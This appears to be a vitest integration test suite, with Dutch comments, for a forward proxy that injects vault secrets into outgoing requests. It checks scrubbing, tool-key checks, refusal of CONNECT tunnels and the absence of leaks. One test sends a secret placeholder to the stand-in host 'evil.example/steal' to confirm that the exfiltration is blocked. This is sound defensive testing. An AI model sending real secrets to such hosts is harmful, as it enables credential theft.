// Forward-proxy met plaatshouder. Het echte proces, een tijdelijke kluis, een nep-API. De nep-API
// ontvangt de echte waarde; de tool ziet ze nergens (antwoord, headers, logs, audit, kluisbestanden).
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { startUpstream } from '../helpers/fakeUpstream.js';
import { tempHome, seedVault, MODES } from '../helpers/journey.js';
import { fakeSecret, findLeaks, readTree } from '../helpers/secretLeak.js';

const value = fakeSecret('demo');
let upstream;
let proc;
let home;
let toolKey;
let revokedKey;


describe.each(MODES)('%s', (mode, start) => {
    beforeAll(async () => {
        upstream = await startUpstream((req, res, record) => {
            // De nep-API echoot wat ze kreeg (zoals een debug-endpoint): dat moet gescrubd terugkomen.
            res.writeHead(200, { 'content-type': 'application/json', 'x-echo-auth': record.headers.authorization ?? '' });
            res.end(JSON.stringify({ youSent: record.headers.authorization, url: record.url }));
        });
        home = tempHome();
        ({ toolKey, revokedKey } = await seedVault(home, async ({ registry }) => {
            // 9.4: deze tests gebruiken het secret ook in de query (token) en in x-token; dat moet expliciet toegestaan zijn.
            await registry.addSecret({ name: 'demo', value, hosts: [upstream.origin], inject: ['header:authorization', 'header:x-token', 'query:token'] });
            const mytool = await registry.addTool({ name: 'mytool' });
            const old = await registry.addTool({ name: 'oud' });
            await registry.revokeTool(old.id);
            await registry.addGrant({ toolId: mytool.id, secretName: 'demo', host: upstream.origin, origin: 'portal' });
            await registry.addGrant({ toolId: old.id, secretName: 'demo', host: upstream.origin, origin: 'portal' });
            return { toolKey: mytool.key, revokedKey: old.key };
        }));
        proc = await start(home);
    }, 30_000);

    afterAll(async () => {
        await proc?.stop();
        await upstream?.close();
    });

    const forward = (url, headers = {}) => fetch(`${proc.proxy}/forward/${url}`, { headers });

    describe('forward-proxy met plaatshouder', () => {
        it('Given een tool met key en toekenning When een call met {{secret:demo}} Then ontvangt de nep-API de waarde en ziet de tool die nergens', async () => {
            const res = await forward(`${upstream.origin}/user?token={{secret:demo}}`, { 'x-vault-gate-tool-key': toolKey, authorization: 'Bearer {{secret:demo}}' });
            const body = await res.text();
            expect(res.status).toBe(200);
            const received = upstream.requests.at(-1);
            expect(received.headers.authorization).toBe(`Bearer ${value}`);
            expect(received.url).toBe(`/user?token=${value}`);
            expect(received.headers['x-vault-gate-tool-key']).toBeUndefined(); // de tool-key gaat nooit naar de doelhost
            expect(JSON.stringify(received.headers)).not.toContain(toolKey);
            expect(body).toContain('Bearer ***');
            expect(res.headers.get('x-echo-auth')).toBe('Bearer ***');
            expect(findLeaks({ body, headers: JSON.stringify([...res.headers]) }, [value])).toEqual([]);
        });

        it('Given een antwoord dat de waarde terugstuurt When gescrubd Then staat er een auditregel response-scrubbed met het aantal (voor de teller op het dashboard)', async () => {
            const res = await forward(`${upstream.origin}/echo`, { 'x-vault-gate-tool-key': toolKey, authorization: 'Bearer {{secret:demo}}' });
            await res.text();
            // The scrub event is logged after the response has ended, so the one of the previous test can still arrive
            // now: count only the events of THIS request (the n-th request the fake API saw has the n-th upstream event).
            const n = upstream.requests.length;
            const scrubbedOf = id => proc.events.filter(e => e.rule === 'response-scrubbed' && e.requestId === id);
            const deadline = Date.now() + 5000;
            const ours = () => proc.events.filter(e => e.event === 'upstream')[n - 1]?.requestId;
            while ((!ours() || scrubbedOf(ours()).length === 0) && Date.now() < deadline) await new Promise(r => setTimeout(r, 20));
            expect(ours()).toBeDefined();
            expect(scrubbedOf(ours())).toHaveLength(1);
        });

        it('Given een tool zonder key When dezelfde call Then krijgt hij 401 met rule: no-tool-key, en de nep-API ziet niets', async () => {
            const before = upstream.requests.length;
            const res = await forward(`${upstream.origin}/user`, { authorization: 'Bearer {{secret:demo}}' });
            expect(res.status).toBe(401);
            expect(res.headers.get('x-vault-gate-rule')).toBe('no-tool-key');
            expect(await res.json()).toMatchObject({ error: { rule: 'no-tool-key' } });
            expect(upstream.requests.length).toBe(before);
        });

        it('een ingetrokken key geeft 401 tool-key-revoked', async () => {
            const res = await forward(`${upstream.origin}/user`, { 'x-vault-gate-tool-key': revokedKey, authorization: 'Bearer {{secret:demo}}' });
            expect(res.status).toBe(401);
            expect((await res.json()).error.rule).toBe('tool-key-revoked');
        });

        it('een onbekende secret-naam: 403 unknown-secret, met de naam in de melding en zonder iets te ontsleutelen', async () => {
            const res = await forward(`${upstream.origin}/user`, { 'x-vault-gate-tool-key': toolKey, authorization: 'Bearer {{secret:bestaat_niet}}' });
            expect(res.status).toBe(403);
            expect(await res.json()).toMatchObject({ error: { rule: 'unknown-secret', secret: 'bestaat_niet' } });
        });

        it('geen plaatshouder: 400 no-placeholder (de proxy is geen open doorgeefluik)', async () => {
            const res = await forward(`${upstream.origin}/user`, { 'x-vault-gate-tool-key': toolKey });
            expect(res.status).toBe(400);
            expect((await res.json()).error.rule).toBe('no-placeholder');
        });

        it('Given het echte proces en een secret voor api.example When een tool het naar een andere host stuurt Then krijgt ze 403 met rule: target-host-not-allowed en een zin met de host; findLeaks vindt de waarde nergens', async () => {
            const res = await forward('https://evil.example/steal', { 'x-vault-gate-tool-key': toolKey, authorization: 'Bearer {{secret:demo}}' });
            expect(res.status).toBe(403);
            expect(res.headers.get('x-vault-gate-rule')).toBe('target-host-not-allowed');
            const data = await res.json();
            expect(data.error.rule).toBe('target-host-not-allowed');
            expect(data.error.message).toContain('evil.example');
            expect(data.error.message).toContain('demo');
            expect(data.error.message).not.toContain(value);
            expect(findLeaks({ body: JSON.stringify(data) }, [value])).toEqual([]);
        });

        it('ook als klassieke HTTP-proxy (absolute-form request) en met de key als Proxy-Authorization', async () => {
            const http = await import('node:http');
            const { port } = new URL(proc.proxy);
            const status = await new Promise((resolve, reject) => {
                const req = http.request({ host: '127.0.0.1', port, method: 'GET', path: `${upstream.origin}/abs`, headers: { 'proxy-authorization': `Bearer ${toolKey}`, 'x-token': '{{secret:demo}}' } }, res => { res.resume(); resolve(res.statusCode); });
                req.on('error', reject);
                req.end();
            });
            expect(status).toBe(200);
            expect(upstream.requests.at(-1)).toMatchObject({ url: '/abs', headers: { 'x-token': value } });
            expect(upstream.requests.at(-1).headers['proxy-authorization']).toBeUndefined();
        });

        it('CONNECT (tunnel) wordt geweigerd met een regelnaam', async () => {
            const net = await import('node:net');
            const { port } = new URL(proc.proxy);
            const reply = await new Promise(resolve => {
                const s = net.connect(port, '127.0.0.1', () => s.write('CONNECT api.github.com:443 HTTP/1.1\r\nHost: api.github.com:443\r\n\r\n'));
                let data = '';
                s.on('data', d => { data += d; if (data.includes('\r\n\r\n')) { s.destroy(); resolve(data); } });
            });
            expect(reply).toMatch(/^HTTP\/1\.1 405/);
            expect(reply).toMatch(/x-vault-gate-rule: tunnel-not-supported/i);
        });

        it('nergens een lek: niet in de uitvoer van het proces en niet in de kluisbestanden (property: geen waarde in uitvoer)', async () => {
            const captured = { stdout: proc.output(), ...readTree(home) };
            expect(findLeaks(captured, [value, toolKey])).toEqual([]);
        });
    });
});
